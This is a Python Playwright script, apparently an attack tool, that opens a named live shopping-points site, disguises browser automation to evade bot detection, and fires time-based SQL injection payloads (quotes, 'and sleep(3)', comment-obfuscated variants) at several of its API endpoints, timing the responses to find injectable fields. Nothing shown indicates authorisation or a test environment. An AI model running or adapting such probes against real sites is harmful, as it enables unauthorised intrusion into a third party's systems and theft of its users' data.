from playwright.sync_api import sync_playwright
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
with sync_playwright() as p:
    b=p.chromium.launch(headless=False, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage'])
    ctx=b.new_context(user_agent=UA, viewport={'width':1366,'height':768}, locale='zh-CN', timezone_id='Asia/Shanghai')
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});window.chrome={runtime:{}};")
    page=ctx.new_page(); page.goto("https://m.lbtek.com/points-mall", wait_until="domcontentloaded", timeout=60000)
    for i in range(12):
        page.wait_for_timeout(2000); c=page.content()
        if 'arg1=' not in c and 'renderData' not in c: break
    print('ready',flush=True)
    res=page.evaluate("""async () => {
      const out={};
      const post=async(n,u,body,extra)=>{try{const h=Object.assign({'lang':'zh-CN','Content-Type':'application/json'},extra||{});const t0=performance.now();const r=await fetch(u,{method:'POST',headers:h,body:JSON.stringify(body)});const ms=Math.round(performance.now()-t0);const t=await r.text();out[n]=r.status+'|'+ms+'ms|'+(t.length>140?t.slice(0,140):t);}catch(e){out[n]='ERR '+String(e).slice(0,60);}};
      await post('nfl_base','/api/v1/not-found-log',{target_url:'/probe-a'});
      await post('nfl_quote','/api/v1/not-found-log',{target_url:"/probe-a'"});
      await post('nfl_sleep','/api/v1/not-found-log',{target_url:'/probe-a and sleep(3)'});
      await post('nfl_sleep_cmt','/api/v1/not-found-log',{target_url:'0/**/or/**/sleep(3)'});
      await post('mv_base','/api/v1/member-visit',{});
      await post('mv_quote','/api/v1/member-visit',{target_url:"x'",url:"x'",path:"x'",referer:"x'"});
      await post('mv_sleep','/api/v1/member-visit',{target_url:'0 and sleep(3)',url:'0 and sleep(3)',path:'0 and sleep(3)'});
      await post('cr_base','/api/v1/home/clickRecord',{});
      await post('cr_sleep','/api/v1/home/clickRecord',{id:'0 and sleep(3)',productId:'0 and sleep(3)',listId:'0 and sleep(3)'});
      await post('fb_sleep','/api/v1/feedback',{product_id:'0 and sleep(3)',content:'x'});
      return out;
    }""")
    print('===== SQLI3 =====',flush=True)
    for k,v in res.items(): print('%-16s %s'%(k,v),flush=True)
    b.close()
